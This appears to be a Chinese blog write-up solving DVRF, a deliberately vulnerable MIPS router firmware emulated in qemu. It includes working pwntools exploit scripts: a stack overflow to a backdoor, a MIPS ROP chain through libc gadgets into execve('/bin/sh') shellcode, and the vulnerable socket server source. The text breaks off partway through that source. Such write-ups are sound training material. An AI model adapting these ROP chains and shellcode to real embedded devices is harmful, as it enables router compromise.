        <content type="html"><![CDATA[<h2 id="DVRF-项目介绍"><a href="#DVRF-项目介绍" class="headerlink" title="DVRF 项目介绍"></a>DVRF 项目介绍</h2><p>该项目目标是模拟一个真实的环境，帮助人们了解 x86_64 之外的其他 CPU 架构。此固件是针对 Linksys E1550 设备量身定制的。如果您没有，请不要担心！可以用 qemu 模拟。</p><p>项目地址：<a href="https://github.com/praetorian-inc/DVRF">https://github.com/praetorian-inc/DVRF</a></p><h2 id="模拟环境"><a href="#模拟环境" class="headerlink" title="模拟环境"></a>模拟环境</h2><p>主要是用 ubuntu 16 ，如果部分题目用 qemu-user 模拟不了，就转去 attify 3.0 。但是 attify gdb 插件 gef 视乎在模拟时 vmmap 查不过来 libc 地址，问题不大只是查询方法饶了一点，还是可以解决的。</p><ul><li>ubuntu 16.04<ul><li>pwndbg</li><li>Qemu-static(version 2.11.1)</li><li>gdb-multiarch</li></ul></li><li>attify 3.0<ul><li>下载地址：<a href="https://github.com/adi0x90/attifyos">https://github.com/adi0x90/attifyos</a></li></ul></li></ul><h2 id="stack-bof-01"><a href="#stack-bof-01" class="headerlink" title="stack_bof_01"></a>stack_bof_01</h2><p>获取参数后，未校验长度赋值给局部变量造成栈溢出，有后门函数 <code>0x00400950</code> ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210311234221.png" alt="image-20210311234221215"></p><p>Main 函数由 libc_main_start 调用，即 main 函数为<strong>非叶子函数</strong>，返回地址存放在栈上，从汇编可见：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210311234457.png" alt="image-20210311234457308"><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210311234516.png" alt="image-20210311234516201"></p><p>直接跳转 0x00400950 会因为 t9 的值被修改而错误。<strong>mips默认 t9 为当前函数开始地址。函数内部通过 t9 寄存器和 gp 寄存器来找数据，地址等。</strong></p><p>其他师傅文章中是通过找 libc 中的 <code>lw $t9, arg_0($sp);jalr $t9</code> 调整 t9 寄存器。但是我固件镜像中的 libc 没有这个 gadget ，按照偏移地址跳转过去是 <code>jalr $t9</code> 。换个思路直接跳过 dat_shell 开头调整 gp 部分：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210312111808.png" alt="image-20210312111802336"></p><p>修复 t9 寄存器思路参考师傅文章：<a href="https://www.cnblogs.com/hac425/p/9416758.html">https://www.cnblogs.com/hac425/p/9416758.html</a></p><h3 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h3><p>需要打开几个 terminal 启动不同的命令：</p><ul><li><p>启动 qemu 模拟</p><blockquote><p>-strace 查看 qemu 调试信息，方便观察执行了什么命令</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel-static -L . -g 1234 -strace ./pwnable/Intro/uaf_01 aaaa</span><br></pre></td></tr></table></figure></li><li><p>gdb-multiarch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./pwnable/Intro/stack_bof_01</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> architecture mips</span><br><span class="line"><span class="built_in">set</span> endian little</span><br><span class="line">target remote :1234</span><br></pre></td></tr></table></figure></li></ul><p>连上之后会停在 start ，在 main 函数开头打断点，运行到这个断点，然后就慢慢单步调试。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>字符串是从参数读入，跳转地址转换后是不可见字符 ，需要借助 <code>cat</code> 传入参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file_name: stack_bof_01.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&quot;./pwnable/Intro/stack_bof_01&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x0040095c</span> </span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xc8</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload += p32(backdoor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;stack_bof_01_payload&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">file.write(payload)</span><br></pre></td></tr></table></figure><p>命令行执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 <span class="string">&quot;`cat stack_bof_01_payload`&quot;</span></span><br></pre></td></tr></table></figure><h2 id="stack-bof-02"><a href="#stack-bof-02" class="headerlink" title="stack_bof_02"></a>stack_bof_02</h2><p>和前面一题差不多，调试方法也一样，就是少了后门函数，造成溢出函数变成了 <code>strcpy</code> ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210312174644.png" alt="image-20210312174639280"></p><p>main 非叶子函数覆盖函数返回地址跳转存放在栈上的 shellocde 。qemu 模拟地址没有随机化，相当于 aslr 关闭了，直接调试查出 v4 的内存地址</p><blockquote><p>Shellcode 查询：<a href="http://shell-storm.org/shellcode/files/shellcode-792.php">http://shell-storm.org/shellcode/files/shellcode-792.php</a></p></blockquote><p>直接写入 shellcode 可以完整执行完，但是执行 <code>syscall 0x40404</code> 之后没有弹 shell 而是进行运行到下一条指令。问了师傅说也有遇到过这种情况，通过加无意义的指令(nop)调整 shellcode 位置有机会能成，用了 <code>XOR $t1, $t1, $t1</code> 避免 strcpy <code>\x00</code> 截断（只有不包含截断符指令都行），尝试后无果。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210312182503.png" alt="image-20210312182502998"></p><p>查阅资料后发现，由于 mips 是流水指令集，存在 cache incoherency 的特性，需要调用 sleep 或者其他函数将数据区刷新到当前指令区中去，才能正常执行 shellcode 。</p><blockquote><p><a href="https://ctf-wiki.org/pwn/linux/mips/mips_rop/#2-dvrf-stack_bof_02c">https://ctf-wiki.org/pwn/linux/mips/mips_rop/#2-dvrf-stack_bof_02c</a></p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210312200133.png" alt="image-20210312200133500"></p><p>构造 ROP 的 gadget 得去 libc 找，程序自身没多少个。我在 ubuntu18 gdb 连上报错，换到 ubuntu16 vmmap 查不出来 libc 信息（如图），最后换 attify 解决问题。</p><blockquote><p>libc路径：/squashfs-root/lib/libc.so.0</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210313011756.png" alt="image-20210313011756132"></p><p>先调用 sleep(1) 就需要找 gadget 控制参数以及跳转。<code>mipsrop.find(&quot;li $a0,1&quot;)</code> 控制第一个参数，任选一个后面 rop 没有 gadget 继续构造就换一个 -。-  ，我选着第二个构造 <code>gadget1 = 0x2FB10</code> ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210313002948.png" alt="image-20210313002948429"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0002FB10                 li      $a0, 1</span><br><span class="line">.text:0002FB14                 move    $t9, $s1</span><br><span class="line">.text:0002FB18                 jalr    $t9 ; sub_2F818</span><br></pre></td></tr></table></figure><p>接着需要找一个控制 s1 的 gadget ，用于控制执行完 gadget1 之后跳转到哪里。<code>mipsrop.find(&quot;li $s1&quot;)</code> 结果有很多，最后选了 <code>gadget2 = 0x00007730</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00007730                 lw      $ra, 0x18+var_s10($sp)</span><br><span class="line">.text:00007734                 lw      $s3, 0x18+var_sC($sp)</span><br><span class="line">.text:00007738                 lw      $s2, 0x18+var_s8($sp)</span><br><span class="line">.text:0000773C                 lw      $s1, 0x18+var_s4($sp)</span><br><span class="line">.text:00007740                 lw      $s0, 0x18+var_s0($sp)</span><br><span class="line">.text:00007744                 jr      $ra</span><br></pre></td></tr></table></figure><p>至此 <strong>a0 被控制为 1</strong> ，目前 payload 结构为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">508</span></span><br><span class="line">payload += p32(gadget2)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;????&quot;</span><span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s3</span></span><br><span class="line">payload += p32(gadget1)<span class="comment">#ra</span></span><br></pre></td></tr></table></figure><p>不能直接将 sleep(0x767142b0) 填到 s1 处，因为直接填地址跳转 sleep 缺少了跳转前将返回地址放到 ra 寄存器（或压栈）的过程，当 sleep 运行到结尾的 <code>jalr $ra</code> 时，又会跳转会到 gadget1 ，所以要换个方式。</p><p><code>mipsrop.tails()</code> 找通过 s0\s2\s3 寄存器跳转的 gadget ，选择了 <code>gadget3 = 0x00020F1C</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00020F1C                 move    $t9, $s2</span><br><span class="line">.text:00020F20                 lw      $ra, 0x18+var_sC($sp)</span><br><span class="line">.text:00020F24                 lw      $s2, 0x18+var_s8($sp)</span><br><span class="line">.text:00020F28                 lw      $s1, 0x18+var_s4($sp)</span><br><span class="line">.text:00020F2C                 lw      $s0, 0x18+var_s0($sp)</span><br><span class="line">.text:00020F30                 jr      $t9</span><br></pre></td></tr></table></figure><p>解决 sleep 运行结束返回地址问题，并 <code>lw $ra, 0x18+var_sC($sp)</code> 控制下一层跳转，payload 结构：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">508</span></span><br><span class="line">payload += p32(gadget2)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += p32(gadget3)<span class="comment">#s1</span></span><br><span class="line">payload += p32(sleep)<span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s3</span></span><br><span class="line">payload += p32(gadget1)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;????&quot;</span><span class="comment">#ra</span></span><br></pre></td></tr></table></figure><p><code>mipsrop.stackfinders()</code> 找一个 gadget 提取栈地址放到寄存器中，找的时候还要注意控制下一次跳转选择 <code>gadget4 = 0x16dd0</code>  这个，通过 gadget3 提前将下次跳转地址写入 s0 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00016DD0                 addiu   $a0, $sp, 0x38+var_20</span><br><span class="line">.text:00016DD4                 move    $t9, $s0</span><br><span class="line">.text:00016DD8                 jalr    $t9</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">508</span></span><br><span class="line">payload += p32(gadget2)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += p32(gadget3)<span class="comment">#s1</span></span><br><span class="line">payload += p32(sleep)<span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s3</span></span><br><span class="line">payload += p32(gadget1)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += <span class="string">&quot;????&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s2</span></span><br><span class="line">payload += p32(gadget4)<span class="comment">#ra</span></span><br></pre></td></tr></table></figure><p>最后找一个用 a0 跳转的 gadget ，一开始用 <code>mipsrop.tails()</code> 没找到，最后用 <code>mipsrop.find(&quot;move $t9,$a0)&quot;)</code> 找着了 <code>gadget5 = 0x214a0</code> ，对 mipsrop 理解不够……</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:000214A0                 move    $t9, $a0</span><br><span class="line">.text:000214A4                 sw      $v0, 0x30+var_18($sp)</span><br><span class="line">.text:000214A8                 jalr    $t9</span><br></pre></td></tr></table></figure><p>最后跳转 shellcode 时，<code>0x000214A4</code> 的这句汇编 <code>sw $v0, 0x30+var_18($sp)</code> 会将 shellcode 第一个指令替换为 nop ，用无意义指令填充，将 shellcode 向后移。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">508</span></span><br><span class="line">payload += p32(gadget2)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += p32(gadget3)<span class="comment">#s1</span></span><br><span class="line">payload += p32(sleep)<span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s3</span></span><br><span class="line">payload += p32(gadget1)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(gadget5)<span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s2</span></span><br><span class="line">payload += p32(gadget4)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += shellcode</span><br></pre></td></tr></table></figure><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&quot;./pwnable/ShellCode_Required/stack_bof_02&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_base = 0x766e5000</span></span><br><span class="line">sleep = <span class="number">0x767142b0</span><span class="comment">#0x2F2B0+0x766e5000</span></span><br><span class="line">gadget1 = <span class="number">0x76714b10</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x76714b10:lia0,1</span></span><br><span class="line"><span class="string">   0x76714b14:movet9,s1</span></span><br><span class="line"><span class="string">   0x76714b18:jalrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget2 = <span class="number">0x766ec730</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x766ec730:lwra,40(sp)</span></span><br><span class="line"><span class="string">   0x766ec734:lws3,36(sp)</span></span><br><span class="line"><span class="string">   0x766ec738:lws2,32(sp)</span></span><br><span class="line"><span class="string">   0x766ec73c:lws1,28(sp)</span></span><br><span class="line"><span class="string">   0x766ec740:lws0,24(sp)</span></span><br><span class="line"><span class="string">   0x766ec744:jrra</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget3 = <span class="number">0x76705f1c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x76705f1c:movet9,s2</span></span><br><span class="line"><span class="string">   0x76705f20:lwra,36(sp)</span></span><br><span class="line"><span class="string">   0x76705f24:lws2,32(sp)</span></span><br><span class="line"><span class="string">   0x76705f28:lws1,28(sp)</span></span><br><span class="line"><span class="string">   0x76705f2c:lws0,24(sp)</span></span><br><span class="line"><span class="string">   0x76705f30:jrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget4 = <span class="number">0x766fbdd0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x766fbdd0:addiua0,sp,24</span></span><br><span class="line"><span class="string">   0x766fbdd4 &lt;optarg&gt;:movet9,s0</span></span><br><span class="line"><span class="string">   0x766fbdd8:jalrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget5 = <span class="number">0x767064a0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x767064a0:movet9,a0</span></span><br><span class="line"><span class="string">   0x767064a4:swv0,24(sp)</span></span><br><span class="line"><span class="string">   0x767064a8:jalrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = <span class="string">&quot;\xff\xff\x06\x28&quot;</span>  <span class="comment"># slti $a2, $zero, -1</span></span><br><span class="line">shellcode += <span class="string">&quot;\x62\x69\x0f\x3c&quot;</span>  <span class="comment"># lui $t7, 0x6962</span></span><br><span class="line">shellcode += <span class="string">&quot;\x2f\x2f\xef\x35&quot;</span>  <span class="comment"># ori $t7, $t7, 0x2f2f</span></span><br><span class="line">shellcode += <span class="string">&quot;\xf4\xff\xaf\xaf&quot;</span>  <span class="comment"># sw $t7, -0xc($sp)</span></span><br><span class="line">shellcode += <span class="string">&quot;\x73\x68\x0e\x3c&quot;</span>  <span class="comment"># lui $t6, 0x6873</span></span><br><span class="line">shellcode += <span class="string">&quot;\x6e\x2f\xce\x35&quot;</span>  <span class="comment"># ori $t6, $t6, 0x2f6e</span></span><br><span class="line">shellcode += <span class="string">&quot;\xf8\xff\xae\xaf&quot;</span>  <span class="comment"># sw $t6, -8($sp)</span></span><br><span class="line">shellcode += <span class="string">&quot;\xfc\xff\xa0\xaf&quot;</span>  <span class="comment"># sw $zero, -4($sp)</span></span><br><span class="line">shellcode += <span class="string">&quot;\xf5\xff\xa4\x27&quot;</span>  <span class="comment"># addiu $a0, $sp, -0xc</span></span><br><span class="line">shellcode += <span class="string">&quot;\xff\xff\x05\x28&quot;</span>  <span class="comment"># slti $a1, $zero, -1</span></span><br><span class="line">shellcode += <span class="string">&quot;\xab\x0f\x02\x24&quot;</span>  <span class="comment"># addiu;$v0, $zero, 0xfab</span></span><br><span class="line">shellcode += <span class="string">&quot;\x0c\x01\x01\x01&quot;</span>  <span class="comment"># syscall 0x40404</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">508</span></span><br><span class="line">payload += p32(gadget2)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += p32(gadget3)<span class="comment">#s1</span></span><br><span class="line">payload += p32(sleep)<span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s3</span></span><br><span class="line">payload += p32(gadget1)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(gadget5)<span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s2</span></span><br><span class="line">payload += p32(gadget4)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;stack_bof_02_payload&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">file.write(payload)</span><br></pre></td></tr></table></figure><h2 id="socket-bof"><a href="#socket-bof" class="headerlink" title="socket_bof"></a>socket_bof</h2><p>这题二进制文件用 ida 看伪代码有点瑕疵，本来溢出点变成了一个指针，导致一直找不到，最后无奈去看了下源码和结合汇编。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Pwnable Socket Program</span></span><br><span class="line"><span class="comment">// By b1ack0wl</span></span><br><span class="line"><span class="comment">// Stack Overflow</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc &lt;<span class="number">2</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: %s port_number - by b1ack0wl\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">500</span>] = <span class="string">&quot;\0&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> endstr[<span class="number">50</span>] = <span class="string">&quot;\0&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> listen_fd, comm_fd;</span><br><span class="line">    <span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> option = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span>;</span></span><br><span class="line"> </span><br><span class="line">    listen_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    bzero( &amp;servaddr, <span class="keyword">sizeof</span>(servaddr));</span><br><span class="line"> 